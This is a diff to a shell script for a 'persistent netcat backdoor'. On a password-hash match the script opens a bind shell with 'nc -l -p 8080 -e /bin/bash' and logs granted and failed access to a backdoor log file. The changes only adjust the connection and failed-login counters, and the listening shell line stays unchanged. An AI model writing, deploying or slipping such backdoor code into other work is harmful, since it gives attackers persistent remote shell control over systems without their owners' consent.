@@ -30,8 +30,7 @@ else
 fi
 
 NOW=`date`
-CONECTIONS=1
-FAILED=1
+FAILED=0
 # EXT_IP=`jping 4.ifcfg.me | grep Address | cut -d' ' -f6`
 CLIENT=`netstat | grep 12345 | cut -d' ' -f16 | cut -d':' -f4`
 
@@ -52,16 +51,15 @@ do
         SHELL_MATCH=$(echo $LINE | sha512sum | grep -c '870c042ce30e4908f0393eeb32b4b05f6644f597ceef71b8e93cf418fac01e5cea81f9a825ca3e5393d108919fa79dc15a27441c3a20af3b8a8d9aa2fb3d71ff')
        
         if [ $SHELL_MATCH -eq 1 ]; then
-            echo "[+] Server shell access number [$CONECTIONS] granted to [$CLIENT] at [$(date)]" >> persistentNC/persistentNCbackdoor.log
+            echo "[+] Server shell access granted to [$CLIENT] at [$(date)]" >> persistentNC/persistentNCbackdoor.log
             cat persistentNC/persistentNCbackdoor.log | tail -n-1
             nc -l -p 8080 -e /bin/bash # /data/data/com.spartacusrex.spartacuside/files/system/bin/bash
-            echo "[-] Shell access number [$CONECTIONS] to [$CLIENT] terminated at [$(date)]" >> persistentNC/persistentNCbackdoor.log
+            echo "[-] Shell access to [$CLIENT] terminated at [$(date)]" >> persistentNC/persistentNCbackdoor.log
             cat persistentNC/persistentNCbackdoor.log | tail -n-1           
-            let CONECTIONS++
         else
+            let FAILED++
             echo "[!] WARNING: Failed login atempt number [$FAILED] from [$CLIENT] at [$(date)]" >> persistentNC/persistentNCbackdoor.log
             cat persistentNC/persistentNCbackdoor.log | tail -n-1       
-            let FAILED++
         fi
     done
 done
